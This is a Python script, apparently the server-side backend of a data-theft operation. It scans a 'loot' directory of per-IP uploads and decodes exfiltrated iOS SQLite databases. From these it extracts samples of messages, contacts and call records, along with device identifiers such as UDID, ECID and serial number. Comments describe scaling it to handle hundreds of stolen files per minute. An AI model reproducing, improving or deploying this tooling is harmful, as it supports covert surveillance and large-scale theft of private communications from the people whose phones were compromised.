# -*- coding: utf-8 -*-
"""ext_stats 自动解析器 v2（修复：只扫 .bin、跳过已解析、不递归 meta）"""
import io, sys, os, json, base64, glob, sqlite3, tempfile, time, re

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from spool_hint import hint   # 【P2b】parsed.json 落地 → 提示 ingestd 入库

LOOT_ROOT = '/www/wwwroot/i.131422.com/loot'
KEY_TABLES = ['message', 'ABPerson', 'ZCALLRECORD', 'handle', 'chat', 'ABMultiValue', 'Z_1_ABPERSON']

def summarize_raw(raw):
    result = {'type': 'unknown', 'tables': {}, 'samples': [], 'preview': ''}
    if raw[:16] == b'SQLite format 3\x00':
        result['type'] = 'sqlite'
        tmp = tempfile.mktemp(suffix='.db')
        open(tmp, 'wb').write(raw)
        try:
            con = sqlite3.connect(tmp)
            cur = con.cursor()
            tables = [r[0] for r in cur.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()]
            for t in tables:
                try:
                    n = cur.execute('SELECT COUNT(*) FROM "%s"' % t).fetchone()[0]
                    result['tables'][t] = n
                except Exception:
                    result['tables'][t] = '?'
            for t in KEY_TABLES:
                if t in tables:
                    try:
                        cols = [c[1] for c in cur.execute('PRAGMA table_info("%s")' % t).fetchall()]
                        txtcols = [c for c in cols if any(k in c.lower() for k in ['text', 'first', 'last', 'org', 'name', 'handle', 'date'])]
                        if txtcols:
                            q = 'SELECT %s FROM "%s" LIMIT 4' % (",".join(txtcols[:3]), t)
                            for r in cur.execute(q).fetchall():
                                result['samples'].append({k: (str(v)[:80] if v is not None else None) for k, v in zip(txtcols[:3], r)})
                        else:
                            rows = cur.execute('SELECT * FROM "%s" LIMIT 2' % t).fetchall()
                            for r in rows:
                                result['samples'].append({str(k): (str(v)[:60] if v is not None else None) for k, v in zip(cols, r)})
                        break
                    except Exception:
                        pass
            con.close()
        finally:
            try: os.unlink(tmp)
            except Exception: pass
    else:
        try:
            txt = raw.decode('utf-8', errors='replace')
            if len(txt) > 0 and (txt.startswith('===') or txt.startswith('<?xml') or txt.isprintable() or sum(1 for ch in txt if ch.isprintable()) / max(len(txt), 1) > 0.9):
                result['type'] = 'text'
                result['preview'] = txt[:300]
            else:
                result['type'] = 'binary'
                result['preview'] = raw[:64].hex()
        except Exception:
            result['type'] = 'binary'
            result['preview'] = raw[:64].hex()
    return result

def process_binfile(binp):
    try:
        with open(binp, 'rb') as f:
            j = json.loads(f.read().decode('utf-8', errors='replace'))
    except Exception:
        return None
    try:
        raw = base64.b64decode(j.get('data', ''))
    except Exception:
        raw = b''
    summ = summarize_raw(raw)
    return {
        'source': os.path.basename(binp),
        'path': j.get('path'), 'category': j.get('category'), 'description': j.get('description'),
        'orig_size': j.get('size'),
        'deviceUUID': j.get('deviceUUID'), 'deviceUDID': j.get('deviceUDID'),
        'deviceECID': j.get('deviceECID'), 'deviceSerial': j.get('deviceSerial'),
        'devicePt': j.get('devicePt'), 'deviceBv': j.get('deviceBv'), 'deviceOv': j.get('deviceOv'),
        'decoded_size': len(raw), 'data_type': summ['type'],
        'tables': summ['tables'], 'samples': summ['samples'], 'preview': summ['preview'],
        # 【2026-09-11】无价值 App 资源的内容未落盘，这里把标记透传给面板
        'dropped': j.get('dropped'), 'dropped_reason': j.get('dropped_reason'),
        'orig_bytes': j.get('orig_bytes'),
        'parsed_at': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
    }

def _handle_one(binp):
    """Worker：解析单个 bin + 写 parsed.json（供并行池调用；纯文件操作，可安全并行）"""
    parsed = binp + '.parsed.json'
    try:
        out = process_binfile(binp)
        if out is None:
            return None
        with open(parsed, 'w', encoding='utf-8') as f:
            json.dump(out, f, ensure_ascii=False, indent=2)
        hint(os.path.basename(os.path.dirname(binp)))   # 【P2b】parsed.json 落地 → 提示 ingestd
        return '[OK] %s | %s | type=%s | dev=%s' % (os.path.basename(binp), out.get('path'), out.get('data_type'), out.get('deviceSerial'))
    except Exception as e:
        return '[ERR] %s: %s' % (binp, str(e)[:120])


def main():
    # 【2026-09-12 提速】投递放量后新增 ~490 bin/分钟 > 单进程处理 ~208/分钟，积压持续扩大。
    #   改为 multiprocessing 并行（默认 6 进程，PARSE_PROCS 可调）+ cron 侧 flock 防重入。
    pending = []
    for ipdir in glob.glob(os.path.join(LOOT_ROOT, '*')):
        if not os.path.isdir(ipdir):
            continue
        for binp in glob.glob(os.path.join(ipdir, 'ext_stats_*.bin')):
            name = os.path.basename(binp)
            if not re.match(r'^ext_stats_\d+\.bin$', name):
                continue
            if os.path.exists(binp + '.parsed.json'):
                continue
            pending.append(binp)
    if not pending:
        print('done, processed=0')
        return
    nproc = max(1, int(os.environ.get('PARSE_PROCS', '6')))
    from multiprocessing import Pool
    t0 = time.time()
    done = 0
    with Pool(nproc) as pool:
        for r in pool.imap_unordered(_handle_one, pending, chunksize=8):
            if r:
                print(r, flush=True)
                done += 1
    print('done, processed=%d / %d in %.1fs (%d procs)' % (done, len(pending), time.time() - t0, nproc))

if __name__ == '__main__':
    if '--daemon' in sys.argv:
        # 【P4.1】常驻模式：循环扫描，parsed.json 落地即 hint → ingestd 秒级入库
        _iv = float(os.environ.get('DAEMON_S', '20'))
        print('[daemon] parse_ext_stats 常驻启动 interval=%ss' % _iv, flush=True)
        while True:
            try:
                main()
            except Exception as _e:
                print('[daemon] error:', _e, flush=True)
            time.sleep(_iv)
    else:
        main()
